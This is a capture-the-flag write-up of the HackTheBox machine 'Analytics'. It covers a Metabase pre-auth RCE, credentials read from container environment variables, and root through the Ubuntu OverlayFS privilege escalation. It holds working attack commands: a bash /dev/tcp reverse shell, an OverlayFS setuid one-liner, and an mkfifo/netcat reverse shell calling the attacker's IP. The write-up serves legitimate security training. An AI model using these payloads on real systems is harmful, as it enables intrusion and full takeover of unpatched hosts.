---
layout: post
title: Analytics - HackTheBox
categories:
- HackTheBox
tags:
  - metabase
  - credential stuffing
  - overlayfs
  - CVE-2023-0179
  - CVE-2023-0386
date: 2024-03-29
description: Analytics is a easy hackthebox machine that explores a vulnerability in a service called metabase. After gaining foothold into a docker continer we get credentials used in both the database and the ssh. Inside the machine we use a vulnerability in a service called overlayfs to get root.
summary: Analytics is a easy hackthebox machine that explores a vulnerability in a service called metabase. After gaining foothold into a docker continer we get credentials used in both the database and the ssh. Inside the machine we use a vulnerability in a service called overlayfs to get root.
cover:
  image: images/machine_img.png
---

## Recon

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)

```

Add the following hostname to the hosts file(`/etc/hosts`): `analytical.htb` 

## Foothold

Login page takes us to `data.analytical.htb`. We had the subdomain to hosts file and access it.
We notice a service running called Metabase. Searching for exploits for metabase we found one ver recent: <https://github.com/kh4sh3i/CVE-2023-38646>.
Looking into the endpoint `api/session/properties` we get the version `v0.46.6` of metabase which confirms that is vulnerable to this exploit.

```json
"version":{
       "date":"2023-06-29",
       "tag":"v0.46.6",
       "branch":"release-x.46.x",
       "hash":"1bb88f5"
    },
```

However it does not work properly and we had to use the following poc: <https://github.com/robotmikhro/CVE-2023-38646>. 
For detailed information: <https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/>

```shell
nc -lvnpo 1234
python3 single.py -u http://data.analytical.htb -c "bash -i >& /dev/tcp/10.10.14.175/1234 0>&1"
```

With the shell into the machine we know that we are inside a docker container for limited resources that we have.
Looking at the environment variables we found a username(`metalytics`) and password(`An4lytics_ds20223#`) for the metabase.

```shell
$ env
env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=b171a1ee0a25
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/plugins
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=4
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
OLDPWD=/

```

Trying the username and password with the ssh service we got a shell as metalytics: `ssh metalytics@10.10.11.233`
Then use the pass: `An4lytics_ds20223#`

## Privilege Escalation

Once we run linpeas we notice that we do not have a way to gain privilege escalation using files, permissions or crontabs.
This means that the OS or kernel may be exploitable. The OS running is: `Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux`. 

We tried the following CVE's: CVE-2023-0179(<https://github.com/TurtleARM/CVE-2023-0179-PoC>) and CVE-2023-0386(<https://github.com/w0r7h/CVE-2023-0386>) but not get root.

Since the machine is running Ubuntu 22.04 with the kernel version 6.2.0-25-generic we know that the kernel version in this OS has two vulnerabilities CVE-2023-2640 and CVE-2023-32629 in the overlayfs module that lets escalate privileges locally without needing additional permissions. We found this vulnerability in the following links:
- <https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/>
- <https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability>

To execute commands as root:
```shell
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cat /root/root.txt")'
```

To gain a shell as root:
- First, get the netcat version: `nc -h` : `OpenBSD netcat (Debian patchlevel 1.218-4ubuntu1)`
- Second, start a netcat listener: `nc -lvnp 1235`
- Third, send [reverse shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-busybox):
```shell
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.175 1235 >/tmp/f")'
```


